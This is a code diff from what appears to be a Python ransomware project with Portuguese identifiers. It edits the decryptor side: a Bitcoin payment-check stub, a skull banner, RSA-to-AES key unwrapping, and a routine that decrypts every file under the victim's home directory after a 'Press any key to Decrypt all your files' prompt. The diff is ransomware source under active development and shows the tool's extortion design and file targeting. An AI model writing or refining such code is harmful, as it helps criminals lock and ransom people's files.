@@ -39,20 +39,20 @@ def checar_pagamento_btc():
     pass
 
 def decrypt_all():
-    caminho = os.environ['HOME']+'/Desktop/'
-    caminho2 = os.environ['HOME']+'/Área\ de\ Trabalho/'
+    caminho = os.path.expanduser('~')+'/Desktop/'
+    caminho2 = os.path.expanduser('~')+'/Área\ de\ Trabalho/'
     if(os.path.isdir(caminho)):
         caminho_correto = caminho
     elif(os.path.isdir(caminho2)):
         caminho_correto = caminho2
 
-    SRSA_to_RSA()
-    print('[*] chave privada do cliente descriptografada')
-    RSA_to_AES()
-    print('[*] chave AES descriptografada')
+    #SRSA_to_RSA()
+    #print('[*] chave privada do cliente descriptografada')
+    #RSA_to_AES()
+    #print('[*] chave AES descriptografada')
     f = open(caminho_correto + 'AES.txt','r')
     chave_aes = f.read()
-    #decrypt(chave_aes, os.environ['HOME'])
+    decrypt(chave_aes, os.path.expanduser('~'))
 
 
 def decrypt(key, diretorio):
@@ -68,4 +68,8 @@ def decrypt(key, diretorio):
 if __name__ == '__main__':
     os.system('clear')
     print('{0}'+skull+'{1}').format(RED,GREEN)
+    try:
+        inicia = raw_input('Press any key to Decrypt all your files')
+    except:
+        exit()
     decrypt_all()
